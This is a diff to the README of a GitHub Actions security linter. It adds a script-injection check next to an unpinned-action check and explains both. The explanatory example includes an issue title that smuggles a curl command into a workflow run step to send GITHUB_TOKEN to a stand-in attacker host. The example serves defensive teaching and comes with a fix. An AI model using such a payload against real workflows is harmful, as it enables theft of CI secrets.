@@ -1,8 +1,9 @@
 # gh-action-lint
 
-A linter for GitHub Actions workflows that checks actions are pinned to a full commit SHA rather than a mutable tag or branch name.
+A linter for GitHub Actions workflows that detects common security vulnerabilities. Currently checks for:
 
-Pinning to a tag like `@v4` or `@main` means your workflow can silently change if the tag is moved. This supply chain attack has been exploited multiple times in 2026 and iis likely to get worse in future. Pinning to a SHA gives you a fully reproducible, tamper-resistant build.
+- **Unpinned actions** — actions referenced by a tag or branch name rather than a full commit SHA
+- **Script injection** — user-controlled data embedded directly in `run:` steps
 
 ## Installation
 
@@ -41,29 +42,85 @@ GITHUB_TOKEN=$(gh auth token) gh-action-lint check --recursive
 ### Example output
 
 ```
-.github/workflows/ci.yml:8: action not pinned to a SHA: actions/checkout@v4
-.github/workflows/ci.yml:12: action not pinned to a SHA: actions/cache@main
-actions/checkout@11bd317f...:5: action not pinned to a SHA: actions/cache@v3
+.github/workflows/ci.yml:7: action not pinned to a SHA: actions/checkout@v4
+.github/workflows/ci.yml:9: script injection: ${{ github.event.issue.title }} used directly in run step
 ```
 
 Exits with code `1` if any warnings are found, making it suitable for use in CI.
 
-### What is checked
+## Checks
 
-- All files under `.github/workflows/` (`*.yml`, `*.yaml`)
-- All `action.yml` / `action.yaml` files under `.github/actions/` (composite actions)
-- With `--recursive`: the `action.yml` of every external action used, fetched from GitHub, traversing the full dependency graph
+### Unpinned actions
 
-A `uses:` value is considered unsafe if the ref after `@` is not a full 40-character hex commit SHA. The following are **ignored** (not flagged):
+Pinning to a tag like `@v4` or `@main` means your workflow silently changes if the upstream maintainer (or an attacker who has compromised their account) moves the tag. This is a supply chain attack vector — your CI pipeline executes whatever code the tag now points to.
+
+Pinning to a full 40-character commit SHA gives you a tamper-resistant, fully reproducible build. The tag can be kept as a comment for readability:
+
+```yaml
+# Unsafe — tag can be silently moved
+- uses: actions/checkout@v4
+
+# Safe — exact content is locked in
+- uses: actions/checkout@11bd317f7bc71dd3eee3f1bf1c58bc03de17e433 # v4
+```
+
+The following `uses:` patterns are not flagged:
 
 | Pattern | Example | Reason |
 |---|---|---|
 | Local actions | `./my-action` | No remote ref |
 | Docker images | `docker://alpine:3.18` | Not a GitHub Action |
 
-### Ignoring actions
+### Script injection
 
-Create a `.gh-lint-ignore` file at the root of your repository to suppress warnings for specific actions. Lines starting with `#` are comments.
+GitHub Actions expressions (`${{ ... }}`) are evaluated **before** the shell runs. If a user-controlled value — such as an issue title or PR branch name — is placed directly inside a `run:` step, an attacker can break out of the intended command and run arbitrary code in your CI environment.
+
+#### Example attack
+
+A workflow that automatically labels issues:
+
+```yaml
+on: issues
+jobs:
+  label:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Processing issue: ${{ github.event.issue.title }}"
+```
+
+An attacker opens an issue with the title:
+
+```
+a"; curl https://evil.example.com/exfil?token=$GITHUB_TOKEN; echo "
+```
+
+The shell sees:
+
+```sh
+echo "Processing issue: a"; curl https://evil.example.com/exfil?token=$GITHUB_TOKEN; echo ""
+```
+
+The `GITHUB_TOKEN` (and anything else in the environment) is exfiltrated.
+
+#### The fix
+
+Assign the expression to an environment variable first. The shell then receives the value as data, not as part of the command string, so shell metacharacters in the value are harmless:
+
+```yaml
+# Unsafe — expression is interpolated into the shell command
+- run: echo "${{ github.event.issue.title }}"
+
+# Safe — value is passed via the environment, not interpolated
+- env:
+    TITLE: ${{ github.event.issue.title }}
+  run: echo "$TITLE"
+```
+
+The following user-controlled contexts are checked: issue/PR titles and bodies, comment and review bodies, commit messages, PR head branch name, discussion titles and bodies, and page names.
+
+## Ignoring actions
+
+Create a `.gh-lint-ignore` file at the root of your repository to suppress unpinned-action warnings for specific actions. Lines starting with `#` are comments. Script injection warnings are always reported and cannot be suppressed here.
 
 ```
 # Trusted third-party actions — we accept the tag-pinning risk
@@ -75,9 +132,9 @@ A pattern without a ref (e.g., `actions/checkout`) matches any ref of that actio
 
 Ignored actions are still traversed during a `--recursive` check, so transitive dependencies of ignored actions are still reported.
 
-### Fixing a warning
+## Fixing unpinned actions
 
-Run `fix` to automatically resolve all unpinned refs to their commit SHA:
+Run `fix` to automatically resolve all unpinned refs to their current commit SHA:
 
 ```sh
 GITHUB_TOKEN=$(gh auth token) gh-action-lint fix
@@ -92,20 +149,10 @@ Output:
 
 The original tag is preserved as a comment so the intent remains readable. Already-pinned actions and actions in `.gh-lint-ignore` are left untouched. `GITHUB_TOKEN` is required to resolve refs via the GitHub API.
 
-### Finding a SHA manually
+To find a SHA manually:
 
 ```sh
 git ls-remote https://github.com/actions/checkout refs/tags/v4
-```
-
-Then update your workflow:
-
-```yaml
-# Before
-- uses: actions/checkout@v4
-
-# After
-- uses: actions/checkout@11bd317f7bc71dd3eee3f1bf1c58bc03de17e433 # v4
 ```
 
 ## License
